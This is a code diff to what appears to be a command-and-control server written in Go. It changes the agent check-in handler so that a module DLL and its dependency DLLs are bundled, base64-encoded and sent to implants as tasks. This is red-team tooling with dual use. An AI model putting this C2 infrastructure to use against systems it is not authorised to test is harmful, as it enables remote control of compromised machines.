@@ -5,7 +5,9 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
+	"os"
 	"path/filepath"
+	"strings"
 	"time"
 
 	"github.com/gin-gonic/gin"
@@ -47,20 +49,50 @@ func (cc *CheckInController) Checkin(ctx *gin.Context) {
 		}
 
 		for i, task := range tasks {
-			//if task.Module != "" {
 			moduleDirPath := filepath.Join(conf.GetModuleUploadPath(), task.Module)
 			moduleName := task.Command.Name
 
 			modulePath := filepath.Join(moduleDirPath, moduleName)
-			moduleBytes, err := utils.LoadAssembly(filepath.Join(modulePath, moduleName+".dll"))
+			mainModuleBytes, err := utils.LoadAssembly(filepath.Join(modulePath, moduleName+".dll"))
 			if err != nil {
-				ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to marshal module config: %s", err.Error())})
+				ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to load main module: %s", err.Error())})
 				return
 			}
 
-			task.Module = base64.StdEncoding.EncodeToString(moduleBytes)
+			loadingModulePath := moduleDirPath + "/" + moduleName + "/"
+			dependencyBytes := make(map[string][]byte)
+			files, err := os.ReadDir(loadingModulePath)
+			if err != nil {
+				ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to read module directory: %s", err.Error())})
+				return
+			}
+
+			logger.Info("Got files: ", files)
+
+			for _, file := range files {
+				if file.Name() != moduleName+".dll" && strings.HasSuffix(file.Name(), ".dll") {
+					depBytes, err := utils.LoadAssembly(filepath.Join(loadingModulePath, file.Name()))
+					if err != nil {
+						ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to load dependency: %s", err.Error())})
+						return
+					}
+					dependencyBytes[file.Name()] = depBytes
+				}
+			}
+
+			moduleBytes := models.ModuleBytes{
+				ModuleBytes:     mainModuleBytes,
+				DependencyBytes: dependencyBytes,
+			}
+
+			moduleBytesJSON, err := json.Marshal(moduleBytes)
+			if err != nil {
+				ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to marshal module bytes: %s", err.Error())})
+				return
+			}
+
+			task.Module = base64.StdEncoding.EncodeToString(moduleBytesJSON)
 			tasks[i] = task
-			//}
 		}
 
 		// Update the agent's last callback time
@@ -77,12 +109,10 @@ func (cc *CheckInController) Checkin(ctx *gin.Context) {
 		}
 
 		var c2response models.C2Request
-
 		c2response.AgentID = c2request.AgentID
 		c2response.Reason = models.Task
 		c2response.Message = string(tasksJSON)
 		ctx.JSON(http.StatusOK, c2response)
-
 	} else if c2request.Reason == models.Response {
 
 		var agentTask models.AgentTask
